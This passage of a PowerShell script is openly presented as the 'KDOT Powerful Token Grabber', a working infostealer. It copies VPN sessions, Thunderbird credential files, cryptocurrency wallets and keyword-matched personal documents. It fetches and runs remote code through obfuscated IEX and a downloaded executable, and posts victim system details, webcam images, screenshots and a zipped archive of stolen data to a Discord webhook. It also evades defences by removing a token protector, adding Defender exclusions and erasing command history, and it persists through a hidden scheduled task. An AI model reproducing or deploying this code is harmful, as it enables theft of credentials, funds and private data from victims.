    # ProtonVPN
    function protonvpnstealer {
        $processname = "protonvpn"
        $protonvpnfolder = "$env:localappdata\protonvpn"  
        if (!(Test-Path $protonvpnfolder)) { return }
        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue' ) { Get-Process -Name $processname | Stop-Process -ErrorAction 'SilentlyContinue' } } catch {}
        $protonvpn_account = "$folder_vpn\ProtonVPN"
        New-Item -ItemType Directory -Force -Path $protonvpn_account
        $pattern = "^(ProtonVPN_Url_[A-Za-z0-9]+)$"
        $directories = Get-ChildItem -Path $protonvpnfolder -Directory | Where-Object { $_.Name -match $pattern }
        $files = Get-ChildItem -Path $protonvpnfolder -File | Where-Object { $_.Name -match $pattern }
        foreach ($directory in $directories) {
            $destinationPath = Join-Path -Path $protonvpn_account -ChildPath $directory.Name
            Copy-Item -Path $directory.FullName -Destination $destinationPath -Recurse -Force
        }
        foreach ($file in $files) {
            $destinationPath = Join-Path -Path $protonvpn_account -ChildPath $file.Name
            Copy-Item -Path $file.FullName -Destination $destinationPath -Force
        }
        Copy-Item -Path "$protonvpnfolder\Startup.profile" -Destination $protonvpn_account -Recurse -force
    }
    
	
    #Surfshark VPN
    function surfsharkvpnstealer {
        $processname = "Surfshark"
        $surfsharkvpnfolder = "$env:appdata\Surfshark"
        if (!(Test-Path $surfsharkvpnfolder)) { return }
        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue' ) { Get-Process -Name $processname | Stop-Process -ErrorAction 'SilentlyContinue' } } catch {}
        $surfsharkvpn_account = "$folder_vpn\Surfshark"
        New-Item -ItemType Directory -Force -Path $surfsharkvpn_account
        Get-ChildItem $surfsharkvpnfolder -Include @("data.dat", "settings.dat", "settings-log.dat", "private_settings.dat") -Recurse | Copy-Item -Destination $surfsharkvpn_account
    }
    
	
    function Export-Data_Sessions {		
        telegramstealer
        elementstealer
        icqstealer
        signalstealer
        viberstealer
        whatsappstealer
        steamstealer
        minecraftstealer
        epicgames_stealer
        ubisoftstealer
        electronic_arts
        growtopiastealer
        nordvpnstealer
        protonvpnstealer
        surfsharkvpnstealer		
    }
    Export-Data_Sessions
	
    # Thunderbird Exfil
    If (Test-Path -Path "$env:USERPROFILE\AppData\Roaming\Thunderbird\Profiles") {
        $Thunderbird = @('key4.db', 'key3.db', 'logins.json', 'cert9.db')
        New-Item -Path "$folder_email\Thunderbird" -ItemType Directory | Out-Null
        Get-ChildItem "$env:USERPROFILE\AppData\Roaming\Thunderbird\Profiles" -Include $Thunderbird -Recurse | Copy-Item -Destination "$folder_email\Thunderbird" -Recurse -Force
    }
	
    function Invoke-Crypto_Wallets {
        If (Test-Path -Path "$env:userprofile\AppData\Roaming\Armory") {
            New-Item -Path "$folder_crypto\Armory" -ItemType Directory | Out-Null
            Get-ChildItem "$env:userprofile\AppData\Roaming\Armory" -Recurse | Copy-Item -Destination "$folder_crypto\Armory" -Recurse -Force
        }
    
        If (Test-Path -Path "$env:userprofile\AppData\Roaming\Atomic") {
            New-Item -Path "$folder_crypto\Atomic" -ItemType Directory | Out-Null
            Get-ChildItem "$env:userprofile\AppData\Roaming\Atomic\Local Storage\leveldb" -Recurse | Copy-Item -Destination "$folder_crypto\Atomic" -Recurse -Force
        }
    
        If (Test-Path -Path "Registry::HKEY_CURRENT_USER\software\Bitcoin") {
            New-Item -Path "$folder_crypto\BitcoinCore" -ItemType Directory | Out-Null
            Get-ChildItem (Get-ItemProperty -Path "Registry::HKEY_CURRENT_USER\software\Bitcoin\Bitcoin-Qt" -Name strDataDir).strDataDir -Include *wallet.dat -Recurse | Copy-Item -Destination "$folder_crypto\BitcoinCore" -Recurse -Force
        }
        If (Test-Path -Path "$env:userprofile\AppData\Roaming\bytecoin") {
            New-Item -Path "$folder_crypto\bytecoin" -ItemType Directory | Out-Null
            Get-ChildItem ("$env:userprofile\AppData\Roaming\bytecoin", "$env:userprofile") -Include *.wallet -Recurse | Copy-Item -Destination "$folder_crypto\bytecoin" -Recurse -Force
        }
        If (Test-Path -Path "$env:userprofile\AppData\Local\Coinomi") {
            New-Item -Path "$folder_crypto\Coinomi" -ItemType Directory | Out-Null
            Get-ChildItem "$env:userprofile\AppData\Local\Coinomi\Coinomi\wallets" -Recurse | Copy-Item -Destination "$folder_crypto\Coinomi" -Recurse -Force
        }
        If (Test-Path -Path "Registry::HKEY_CURRENT_USER\software\Dash") {
            New-Item -Path "$folder_crypto\DashCore" -ItemType Directory | Out-Null
            Get-ChildItem (Get-ItemProperty -Path "Registry::HKEY_CURRENT_USER\software\Dash\Dash-Qt" -Name strDataDir).strDataDir -Include *wallet.dat -Recurse | Copy-Item -Destination "$folder_crypto\DashCore" -Recurse -Force
        }
        If (Test-Path -Path "$env:userprofile\AppData\Roaming\Electrum") {
            New-Item -Path "$folder_crypto\Electrum" -ItemType Directory | Out-Null
            Get-ChildItem "$env:userprofile\AppData\Roaming\Electrum\wallets" -Recurse | Copy-Item -Destination "$folder_crypto\Electrum" -Recurse -Force
        }
        If (Test-Path -Path "$env:userprofile\AppData\Roaming\Ethereum") {
            New-Item -Path "$folder_crypto\Ethereum" -ItemType Directory | Out-Null
            Get-ChildItem "$env:userprofile\AppData\Roaming\Ethereum\keystore" -Recurse | Copy-Item -Destination "$folder_crypto\Ethereum" -Recurse -Force
        }
        If (Test-Path -Path "$env:userprofile\AppData\Roaming\Exodus") {
            New-Item -Path "$folder_crypto\exodus.wallet" -ItemType Directory | Out-Null
            Get-ChildItem "$env:userprofile\AppData\Roaming\exodus.wallet" -Recurse | Copy-Item -Destination "$folder_crypto\exodus.wallet" -Recurse -Force
        }
        If (Test-Path -Path "$env:userprofile\AppData\Roaming\Guarda") {
            New-Item -Path "$folder_crypto\Guarda" -ItemType Directory | Out-Null
            Get-ChildItem "$env:userprofile\AppData\Roaming\Guarda\IndexedDB" -Recurse | Copy-Item -Destination "$folder_crypto\Guarda" -Recurse -Force
        }
        If (Test-Path -Path "$env:userprofile\AppData\Roaming\com.liberty.jaxx") {
            New-Item -Path "$folder_crypto\liberty.jaxx" -ItemType Directory | Out-Null
            Get-ChildItem "$env:userprofile\AppData\Roaming\com.liberty.jaxx\IndexedDB\file__0.indexeddb.leveldb" -Recurse | Copy-Item -Destination "$folder_crypto\liberty.jaxx" -Recurse -Force
        }
        If (Test-Path -Path "Registry::HKEY_CURRENT_USER\software\Litecoin") {
            New-Item -Path "$folder_crypto\Litecoin" -ItemType Directory | Out-Null
            Get-ChildItem (Get-ItemProperty -Path "Registry::HKEY_CURRENT_USER\software\Litecoin\Litecoin-Qt" -Name strDataDir).strDataDir -Include *wallet.dat -Recurse | Copy-Item -Destination "$folder_crypto\Litecoin" -Recurse -Force
        }
        If (Test-Path -Path "Registry::HKEY_CURRENT_USER\software\monero-project") {
            New-Item -Path "$folder_crypto\Monero" -ItemType Directory | Out-Null
            Get-ChildItem (Get-ItemProperty -Path "Registry::HKEY_CURRENT_USER\software\monero-project\monero-core" -Name wallet_path).wallet_path -Recurse | Copy-Item -Destination "$folder_crypto\Monero" -Recurse  -Force
        }
        If (Test-Path -Path "$env:userprofile\AppData\Roaming\Zcash") {
            New-Item -Path "$folder_crypto\Zcash" -ItemType Directory | Out-Null
            Get-ChildItem "$env:userprofile\AppData\Roaming\Zcash" -Recurse | Copy-Item -Destination "$folder_crypto\Zcash" -Recurse -Force
        }
    }
    Invoke-Crypto_Wallets

    $embed_and_body = @{
        "username"    = "KDOT"
        "content"     = "@everyone"
        "title"       = "KDOT"
        "description" = "Powerful Token Grabber"
        "color"       = "3447003"
        "avatar_url"  = "https://i.postimg.cc/k58gQ03t/PTG.gif"
        "url"         = "https://discord.gg/vk3rBhcj2y"
        "embeds"      = @(
            @{
                "title"       = "POWERSHELL GRABBER"
                "url"         = "https://github.com/ChildrenOfYahweh/Powershell-Token-Grabber/tree/main"
                "description" = "New victim info collected !"
                "color"       = "3447003"
                "footer"      = @{
                    "text" = "Made by KDOT, GODFATHER and CHAINSKI"
                }
                "thumbnail"   = @{
                    "url" = "https://i.postimg.cc/k58gQ03t/PTG.gif"
                }
                "fields"      = @(
                    @{
                        "name"  = ":satellite: IP"
                        "value" = "``````$ip``````"
                    },
                    @{
                        "name"  = ":bust_in_silhouette: User Information"
                        "value" = "``````Date: $date `nLanguage: $lang `nUsername: $username `nHostname: $hostname``````"
                    },
                    @{
                        "name"  = ":shield: Antivirus"
                        "value" = "``````$avlist``````"
                    },
                    @{
                        "name"  = ":computer: Hardware"
                        "value" = "``````Screen Size: $screen `nOS: $osversion `nOS Build: $osbuild `nOS Version: $displayversion `nManufacturer: $mfg `nModel: $model `nCPU: $cpu `nGPU: $gpu `nRAM: $raminfo `nHWID: $uuid `nMAC: $mac `nUptime: $uptime``````"
                    },
                    @{
                        "name"  = ":floppy_disk: Disk"
                        "value" = "``````$alldiskinfo``````"
                    }
                    @{
                        "name"  = ":signal_strength: WiFi"
                        "value" = "``````$wifi``````"
                    }
                )
            }
        )
    }

    $payload = $embed_and_body | ConvertTo-Json -Depth 10
    Invoke-WebRequest -Uri $webhook -Method POST -Body $payload -ContentType "application/json" -UseBasicParsing | Out-Null

    # Had to do it like this due to https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=HackTool:PowerShell/EmpireGetScreenshot.A&threatId=-2147224978
    #webcam function doesn't work on anything with .NET 8 or higher. Fix it if you want to use it and make a PR. I tried but I keep getting errors writting to protected memory lol.
    function Get-WebcamIMG {
        I'E'X(New-Object Net.WebClient)."`D`o`wn`l`oa`d`Str`in`g"("https://github.com/Chainski/PowerShell-Token-Grabber/raw/main/frontend-src/webcam.ps1")
    }
    Get-WebcamIMG

    Function Invoke-GrabFiles {
        $grabber = @(
            "2fa",
            "acc",
            "atomic wallet",
            "account",
            "backup",
            "backupcode",
            "bitwarden",
            "bitcoin",
            "code",
            "coinbase",
            "crypto",
            "dashlane",
            "default",
            "discord",
            "disk",
            "eth",
            "exodus",
            "facebook",
            "fb",
            "keepass",
            "keepassxc",
            "keys",
            "lastpass",
            "login",
            "mail",
            "memo",
            "metamask",
            "note",
            "nordpass",
            "pass",
            "paypal",
            "private",
            "pw",
            "recovery",
            "remote",
            "secret",
            "seedphrase",
            "wallet seed",
            "server",
            "syncthing",
            "trading",
            "token",
            "wal",
            "wallet"
        )
        $dest = $important_files
        $paths = "$env:userprofile\Downloads", "$env:userprofile\Documents", "$env:userprofile\Desktop"
        [regex] $grab_regex = "(" + (($grabber | ForEach-Object { [regex]::escape($_) }) -join "|") + ")"
    (Get-ChildItem -path $paths -Include "*.pdf", "*.txt", "*.doc", "*.csv", "*.rtf", "*.docx" -r | Where-Object Length -lt 1mb) -match $grab_regex | Copy-Item -Destination $dest -Force
    }
    Invoke-GrabFiles

    $items = Get-ChildItem -Path "$folder_general" -Filter out*.jpg
    foreach ($item in $items) {
        $name = $item.Name
        curl.exe -F "payload_json={\`"username\`": \`"KDOT\`", \`"content\`": \`":hamsa: **webcam**\`"}" -F "file=@\`"$folder_general\$name\`"" $webhook | out-null
        Remove-Item -Path "$folder_general\$name" -Force
    }
	
    Set-Location "$env:LOCALAPPDATA\Temp"

    $token_prot = Test-Path "$env:APPDATA\DiscordTokenProtector\DiscordTokenProtector.exe"
    if ($token_prot -eq $true) {
        Stop-Process -Name DiscordTokenProtector -Force -ErrorAction 'SilentlyContinue'
        Remove-Item "$env:APPDATA\DiscordTokenProtector\DiscordTokenProtector.exe" -Force -ErrorAction 'SilentlyContinue'
    }

    $secure_dat = Test-Path "$env:APPDATA\DiscordTokenProtector\secure.dat"
    if ($secure_dat -eq $true) {
        Remove-Item "$env:APPDATA\DiscordTokenProtector\secure.dat" -Force
    }

    #try {
    #    Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Discord' -Force -ErrorAction 'SilentlyContinue'  | Out-Null
    #}
    #catch {}

    (New-Object System.Net.WebClient).DownloadFile("https://github.com/ChildrenOfYahweh/Powershell-Token-Grabber/releases/download/AutoBuild/grabber.exe", "$env:LOCALAPPDATA\Temp\main.exe")

    #Stop-Process -Name "discord" -Force -ErrorAction 'SilentlyContinue'  | Out-Null
    #Stop-Process -Name "discordcanary" -Force -ErrorAction 'SilentlyContinue'  | Out-Null
    #Stop-Process -Name "discordptb" -Force -ErrorAction 'SilentlyContinue'  | Out-Null


    $proc = Start-Process $env:LOCALAPPDATA\Temp\main.exe -ArgumentList "$webhook" -NoNewWindow -PassThru
    $proc.WaitForExit()

    $main_temp = "$env:localappdata\temp"
    $avatar = "https://i.postimg.cc/k58gQ03t/PTG.gif"
    curl.exe -F "payload_json={\`"avatar_url\`":\`"$avatar\`",\`"username\`": \`"KDOT\`", \`"content\`": \`"# :desktop: Screenshot\n\n\`"}" -F "file=@\`"$main_temp\screenshot.png\`"" "$($webhook)" | Out-Null

    #TODO ill fix tokens tomorrow
    Move-Item "$main_temp\discord.json" $folder_general -Force	
    Move-Item "$main_temp\screenshot.png" $folder_general -Force
    Move-Item -Path "$main_temp\autofill.json" -Destination "$browser_data" -Force
    Move-Item -Path "$main_temp\cards.json" -Destination "$browser_data" -Force
    Move-Item -Path "$main_temp\cookies_netscape.txt" -Destination "$browser_data" -Force
    Move-Item -Path "$main_temp\downloads.json" -Destination "$browser_data" -Force
    Move-Item -Path "$main_temp\history.json" -Destination "$browser_data" -Force
    Move-Item -Path "$main_temp\passwords.json" -Destination "$browser_data" -Force

    #remove empty dirs
    do {
        $dirs = Get-ChildItem $folder_general -directory -recurse | Where-Object { (Get-ChildItem $_.fullName).count -eq 0 } | Select-Object -expandproperty FullName
        $dirs | Foreach-Object { Remove-Item $_ }
    } while ($dirs.count -gt 0)

    Compress-Archive -Path "$folder_general" -DestinationPath "$env:LOCALAPPDATA\Temp\KDOT.zip" -Force
    curl.exe -X POST -F 'payload_json={\"username\": \"KDOT\", \"content\": \"\", \"avatar_url\": \"https://i.postimg.cc/k58gQ03t/PTG.gif\"}' -F "file=@$env:LOCALAPPDATA\Temp\KDOT.zip" $webhook

    Remove-Item "$env:LOCALAPPDATA\Temp\KDOT.zip" -Force
    Remove-Item "$folder_general" -Force -Recurse
    Remove-Item "$main_temp\main.exe" -Force
}

function Invoke-TASKS {
    Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp"
    Add-MpPreference -ExclusionPath "$env:APPDATA\KDOT"
    New-Item -ItemType Directory -Path "$env:APPDATA\KDOT" -Force
    # Hidden Directory
    $KDOT_DIR = get-item "$env:APPDATA\KDOT" -Force
    $KDOT_DIR.attributes = "Hidden", "System"
    Copy-Item -Path $PSCommandPath -Destination "$env:APPDATA\KDOT\KDOT.ps1" -Force
    $task_name = "KDOT"
    $task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument 'vbscript:createobject("wscript.shell").run("PowerShell.exe -ExecutionPolicy Bypass -File %appdata%\KDOT\KDOT.ps1",0)(window.close)'
    $task_trigger = New-ScheduledTaskTrigger -AtLogOn
    $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
    Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "KDOT" -RunLevel Highest -Force
    Write-Host "Task Created" -ForegroundColor Green
    HOSTS-BLOCKER
    Backup-Data
}

if (INVOKE-AC -eq $true) {
    if ($debug -eq $true) {
        KDMUTEX
    }
    else {
        Hide-Console
        KDMUTEX
    }
    #removes history
    if ($debug) {
        Read-Host "Press Enter to continue..."
    } else {
        [ProcessUtility]::MakeProcessKillable()
    }
    I'E'X([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("UmVtb3ZlLUl0ZW0gKEdldC1QU3JlYWRsaW5lT3B0aW9uKS5IaXN0b3J5U2F2ZVBhdGggLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVl")))
}
else {
    Write-Host ("Please run as admin!") -ForegroundColor Red
    Start-Sleep -s 1
    Request-Admin
}
# SIG # Begin signature block
# MIIWnAYJKoZIhvcNAQcCoIIWjTCCFokCAQExCzAJBgUrDgMCGgUAMGkGCisGAQQB
# gjcCAQSgWzBZMDQGCisGAQQBgjcCAR4wJgIDAQAABBAfzDtgWUsITrck0sYpfvNR
# AgEAAgEAAgEAAgEAAgEAMCEwCQYFKw4DAhoFAAQUjT50DNekpBm5RfFlJnH9m2Lq
# aD+gghDrMIIC/jCCAeagAwIBAgIQRihd14UbBYBFYB6wG6qTWjANBgkqhkiG9w0B
# AQsFADAXMRUwEwYDVQQDDAxLRE9UIFJvb3QgQ0EwHhcNMjQwMjI1MTc1MDM2WhcN
# MzQwMjI1MTgwMDM2WjAXMRUwEwYDVQQDDAxLRE9UIFJvb3QgQ0EwggEiMA0GCSqG
# SIb3DQEBAQUAA4IBDwAwggEKAoIBAQCuGHL4cjbjwjkbEU6YB792yy6geMD6gIbj
# IdPEG5iSpT5hVE2Cw40DcLreoSDoYYrAFuigwJ2cx0wXP3i3HCmqGv2meMqHkJSQ
# B3yTNtxW1PUDJV+xtUmhpxEDNMUG0dXy89w5141UtIMbBLzUtogQh5Sv4czpLmFd
# wetZxAyn4+BDqxk3U+0By70AAwjZaN9kCd2jpIcXfLFtBUvHixaHvry3L1HCFjxr
# ZzfLrjop5rZvA0fbaxlq/B+nWDJnJiAnxV1Um0QrHF/NLkwpmRAmNDMQWBynyFnj
# 0zDO+wR+t5krDnlRVewLt9341eaO/DJ+y10YNBhvr8loqxoMqYQVAgMBAAGjRjBE
# MA4GA1UdDwEB/wQEAwIHgDATBgNVHSUEDDAKBggrBgEFBQcDAzAdBgNVHQ4EFgQU
# 65VlAxlZ3FuFpb4JW3urUvQXdnEwDQYJKoZIhvcNAQELBQADggEBAAd9hMR1Xugr
# ojsGXl8iXpzjYLXJhwOBbRDDhr/PHGP240ZR5/OjkrQv7pjBHfWMXnwfaGMKWVp7
# WKeJJsF/Cg7DTPTp7GyPIfnn2zZv5IJgdaKjkKfVV3KzoqjesgbtqQhUh/KCf37Z
# j8GLjGsvxxC4A4NXFyCEyusG3RDwMDfo4kdCVh9aX2OvR1j1Zu5Ud5UpoUTkighb
# LXQq8mtjrAchM+ojNHVoU52+WX3yQpPqmhnCn5firTRhmWh17Z5ukciMUweRp/rD
# wcbraTfVypJUB5ROoR+i60p+5GsOH9yLYIQgjpWCKSY7uZt67CfNfS2ToIwz287e
# U/vWw7g/MCswggbsMIIE1KADAgECAhAwD2+s3WaYdHypRjaneC25MA0GCSqGSIb3
# DQEBDAUAMIGIMQswCQYDVQQGEwJVUzETMBEGA1UECBMKTmV3IEplcnNleTEUMBIG
# A1UEBxMLSmVyc2V5IENpdHkxHjAcBgNVBAoTFVRoZSBVU0VSVFJVU1QgTmV0d29y
# azEuMCwGA1UEAxMlVVNFUlRydXN0IFJTQSBDZXJ0aWZpY2F0aW9uIEF1dGhvcml0
# eTAeFw0xOTA1MDIwMDAwMDBaFw0zODAxMTgyMzU5NTlaMH0xCzAJBgNVBAYTAkdC
# MRswGQYDVQQIExJHcmVhdGVyIE1hbmNoZXN0ZXIxEDAOBgNVBAcTB1NhbGZvcmQx
# GDAWBgNVBAoTD1NlY3RpZ28gTGltaXRlZDElMCMGA1UEAxMcU2VjdGlnbyBSU0Eg
# VGltZSBTdGFtcGluZyBDQTCCAiIwDQYJKoZIhvcNAQEBBQADggIPADCCAgoCggIB
# AMgbAa/ZLH6ImX0BmD8gkL2cgCFUk7nPoD5T77NawHbWGgSlzkeDtevEzEk0y/NF
# Zbn5p2QWJgn71TJSeS7JY8ITm7aGPwEFkmZvIavVcRB5h/RGKs3EWsnb111JTXJW
# D9zJ41OYOioe/M5YSdO/8zm7uaQjQqzQFcN/nqJc1zjxFrJw06PE37PFcqwuCnf8
# DZRSt/wflXMkPQEovA8NT7ORAY5unSd1VdEXOzQhe5cBlK9/gM/REQpXhMl/VuC9
# RpyCvpSdv7QgsGB+uE31DT/b0OqFjIpWcdEtlEzIjDzTFKKcvSb/01Mgx2Bpm1gK
# VPQF5/0xrPnIhRfHuCkZpCkvRuPd25Ffnz82Pg4wZytGtzWvlr7aTGDMqLufDRTU
# GMQwmHSCIc9iVrUhcxIe/arKCFiHd6QV6xlV/9A5VC0m7kUaOm/N14Tw1/AoxU9k
# gwLU++Le8bwCKPRt2ieKBtKWh97oaw7wW33pdmmTIBxKlyx3GSuTlZicl57rjsF4
# VsZEJd8GEpoGLZ8DXv2DolNnyrH6jaFkyYiSWcuoRsDJ8qb/fVfbEnb6ikEk1Bv8
# cqUUotStQxykSYtBORQDHin6G6UirqXDTYLQjdprt9v3GEBXc/Bxo/tKfUU2wfeN
# gvq5yQ1TgH36tjlYMu9vGFCJ10+dM70atZ2h3pVBeqeDAgMBAAGjggFaMIIBVjAf
# BgNVHSMEGDAWgBRTeb9aqitKz1SA4dibwJ3ysgNmyzAdBgNVHQ4EFgQUGqH4YRkg
# D8NBd0UojtE1XwYSBFUwDgYDVR0PAQH/BAQDAgGGMBIGA1UdEwEB/wQIMAYBAf8C
# AQAwEwYDVR0lBAwwCgYIKwYBBQUHAwgwEQYDVR0gBAowCDAGBgRVHSAAMFAGA1Ud
# HwRJMEcwRaBDoEGGP2h0dHA6Ly9jcmwudXNlcnRydXN0LmNvbS9VU0VSVHJ1c3RS
# U0FDZXJ0aWZpY2F0aW9uQXV0aG9yaXR5LmNybDB2BggrBgEFBQcBAQRqMGgwPwYI
# KwYBBQUHMAKGM2h0dHA6Ly9jcnQudXNlcnRydXN0LmNvbS9VU0VSVHJ1c3RSU0FB
# ZGRUcnVzdENBLmNydDAlBggrBgEFBQcwAYYZaHR0cDovL29jc3AudXNlcnRydXN0
# LmNvbTANBgkqhkiG9w0BAQwFAAOCAgEAbVSBpTNdFuG1U4GRdd8DejILLSWEEbKw
# 2yp9KgX1vDsn9FqguUlZkClsYcu1UNviffmfAO9Aw63T4uRW+VhBz/FC5RB9/7B0
# H4/GXAn5M17qoBwmWFzztBEP1dXD4rzVWHi/SHbhRGdtj7BDEA+N5Pk4Yr8TAcWF
# o0zFzLJTMJWk1vSWVgi4zVx/AZa+clJqO0I3fBZ4OZOTlJux3LJtQW1nzclvkD1/
# RXLBGyPWwlWEZuSzxWYG9vPWS16toytCiiGS/qhvWiVwYoFzY16gu9jc10rTPa+D
# BjgSHSSHLeT8AtY+dwS8BDa153fLnC6NIxi5o8JHHfBd1qFzVwVomqfJN2Udvuq8
# 2EKDQwWli6YJ/9GhlKZOqj0J9QVst9JkWtgqIsJLnfE5XkzeSD2bNJaaCV+O/fex
# UpHOP4n2HKG1qXUfcb9bQ11lPVCBbqvw0NP8srMftpmWJvQ8eYtcZMzN7iea5aDA
# DHKHwW5NWtMe6vBE5jJvHOsXTpTDeGUgOw9Bqh/poUGd/rG4oGUqNODeqPk85sEw
# u8CgYyz8XBYAqNDEf+oRnR4GxqZtMl20OAkrSQeq/eww2vGnL8+3/frQo4TZJ577
# AWZ3uVYQ4SBuxq6x+ba6yDVdM3aO8XwgDCp3rrWiAoa6Ke60WgCxjKvj+QrJVF3U
# uWp0nr1Irpgwggb1MIIE3aADAgECAhA5TCXhfKBtJ6hl4jvZHSLUMA0GCSqGSIb3
# DQEBDAUAMH0xCzAJBgNVBAYTAkdCMRswGQYDVQQIExJHcmVhdGVyIE1hbmNoZXN0
# ZXIxEDAOBgNVBAcTB1NhbGZvcmQxGDAWBgNVBAoTD1NlY3RpZ28gTGltaXRlZDEl
# MCMGA1UEAxMcU2VjdGlnbyBSU0EgVGltZSBTdGFtcGluZyBDQTAeFw0yMzA1MDMw
# MDAwMDBaFw0zNDA4MDIyMzU5NTlaMGoxCzAJBgNVBAYTAkdCMRMwEQYDVQQIEwpN
# YW5jaGVzdGVyMRgwFgYDVQQKEw9TZWN0aWdvIExpbWl0ZWQxLDAqBgNVBAMMI1Nl
# Y3RpZ28gUlNBIFRpbWUgU3RhbXBpbmcgU2lnbmVyICM0MIICIjANBgkqhkiG9w0B
# AQEFAAOCAg8AMIICCgKCAgEApJMoUkvPJ4d2pCkcmTjA5w7U0RzsaMsBZOSKzXew
# cWWCvJ/8i7u7lZj7JRGOWogJZhEUWLK6Ilvm9jLxXS3AeqIO4OBWZO2h5YEgciBk
# QWzHwwj6831d7yGawn7XLMO6EZge/NMgCEKzX79/iFgyqzCz2Ix6lkoZE1ys/Oer
# 6RwWLrCwOJVKz4VQq2cDJaG7OOkPb6lampEoEzW5H/M94STIa7GZ6A3vu03lPYxU
# A5HQ/C3PVTM4egkcB9Ei4GOGp7790oNzEhSbmkwJRr00vOFLUHty4Fv9GbsfPGoZ
# e267LUQqvjxMzKyKBJPGV4agczYrgZf6G5t+iIfYUnmJ/m53N9e7UJ/6GCVPE/Je
# fKmxIFopq6NCh3fg9EwCSN1YpVOmo6DtGZZlFSnF7TMwJeaWg4Ga9mBmkFgHgM1C
# daz7tJHQxd0BQGq2qBDu9o16t551r9OlSxihDJ9XsF4lR5F0zXUS0Zxv5F4Nm+x1
# Ju7+0/WSL1KF6NpEUSqizADKh2ZDoxsA76K1lp1irScL8htKycOUQjeIIISoh67D
# uiNye/hU7/hrJ7CF9adDhdgrOXTbWncC0aT69c2cPcwfrlHQe2zYHS0RQlNxdMLl
# NaotUhLZJc/w09CRQxLXMn2YbON3Qcj/HyRU726txj5Ve/Fchzpk8WBLBU/vuS/s
# CRMCAwEAAaOCAYIwggF+MB8GA1UdIwQYMBaAFBqh+GEZIA/DQXdFKI7RNV8GEgRV
# MB0GA1UdDgQWBBQDDzHIkSqTvWPz0V1NpDQP0pUBGDAOBgNVHQ8BAf8EBAMCBsAw
# DAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDBKBgNVHSAEQzBB
# MDUGDCsGAQQBsjEBAgEDCDAlMCMGCCsGAQUFBwIBFhdodHRwczovL3NlY3RpZ28u
# Y29tL0NQUzAIBgZngQwBBAIwRAYDVR0fBD0wOzA5oDegNYYzaHR0cDovL2NybC5z
# ZWN0aWdvLmNvbS9TZWN0aWdvUlNBVGltZVN0YW1waW5nQ0EuY3JsMHQGCCsGAQUF
# BwEBBGgwZjA/BggrBgEFBQcwAoYzaHR0cDovL2NydC5zZWN0aWdvLmNvbS9TZWN0
# aWdvUlNBVGltZVN0YW1waW5nQ0EuY3J0MCMGCCsGAQUFBzABhhdodHRwOi8vb2Nz
# cC5zZWN0aWdvLmNvbTANBgkqhkiG9w0BAQwFAAOCAgEATJtlWPrgec/vFcMybd4z
# ket3WOLrvctKPHXefpRtwyLHBJXfZWlhEwz2DJ71iSBewYfHAyTKx6XwJt/4+DFl
# DeDrbVFXpoyEUghGHCrC3vLaikXzvvf2LsR+7fjtaL96VkjpYeWaOXe8vrqRZIh1
# /12FFjQn0inL/+0t2v++kwzsbaINzMPxbr0hkRojAFKtl9RieCqEeajXPawhj3DD
# JHk6l/ENo6NbU9irALpY+zWAT18ocWwZXsKDcpCu4MbY8pn76rSSZXwHfDVEHa1Y
# GGti+95sxAqpbNMhRnDcL411TCPCQdB6ljvDS93NkiZ0dlw3oJoknk5fTtOPD+UT
# T1lEZUtDZM9I+GdnuU2/zA2xOjDQoT1IrXpl5Ozf4AHwsypKOazBpPmpfTXQMkCg
# sRkqGCGyyH0FcRpLJzaq4Jgcg3Xnx35LhEPNQ/uQl3YqEqxAwXBbmQpA+oBtlGF7
# yG65yGdnJFxQjQEg3gf3AdT4LhHNnYPl+MolHEQ9J+WwhkcqCxuEdn17aE+Nt/cT
# tO2gLe5zD9kQup2ZLHzXdR+PEMSU5n4k5ZVKiIwn1oVmHfmuZHaR6Ej+yFUK7SnD
# H944psAU+zI9+KmDYjbIw74Ahxyr+kpCHIkD3PVcfHDZXXhO7p9eIOYJanwrCKNI
# 9RX8BE/fzSEceuX1jhrUuUAxggUbMIIFFwIBATArMBcxFTATBgNVBAMMDEtET1Qg
# Um9vdCBDQQIQRihd14UbBYBFYB6wG6qTWjAJBgUrDgMCGgUAoHgwGAYKKwYBBAGC
# NwIBDDEKMAigAoAAoQKAADAZBgkqhkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgor
# BgEEAYI3AgELMQ4wDAYKKwYBBAGCNwIBFTAjBgkqhkiG9w0BCQQxFgQUILwkDIiG
# iorkl2EliSz9w4wfXnEwDQYJKoZIhvcNAQEBBQAEggEAYIUOpaOBaEP3sTM7TCN7
# oOAPX8Et1B8gumiWNzFVEqjZIlxEs21BlK/E4y8Mn0h1PUDwh0pqsyfBTZwbQhKB
# mbSSV3K0P98EbIpipGIV0I8zXY2MGv6RS5dYLQ2rSk3O9FYxGT9CspbpkxX2YEmd
# q2IiZHDQRAjY4ISjaezRvxowtYxRdvhetCcjK/i08plrE6Wn4oXYMBRqNLBNpq2r
# qAMQzc+Z/Q744G9FBexLeNNVzO9gEzzpfmT7F/e9+MI5p2NjFLy0VYEa2IaP910Q
# ukFXUJ+AbwL5YnxQ9oTwtUjnbmkcoIJlHirJN6PAB1neZ8LJC28Qq5g9TvL0jkUp
# kKGCA0swggNHBgkqhkiG9w0BCQYxggM4MIIDNAIBATCBkTB9MQswCQYDVQQGEwJH
# QjEbMBkGA1UECBMSR3JlYXRlciBNYW5jaGVzdGVyMRAwDgYDVQQHEwdTYWxmb3Jk
# MRgwFgYDVQQKEw9TZWN0aWdvIExpbWl0ZWQxJTAjBgNVBAMTHFNlY3RpZ28gUlNB
# IFRpbWUgU3RhbXBpbmcgQ0ECEDlMJeF8oG0nqGXiO9kdItQwDQYJYIZIAWUDBAIC
# BQCgeTAYBgkqhkiG9w0BCQMxCwYJKoZIhvcNAQcBMBwGCSqGSIb3DQEJBTEPFw0y
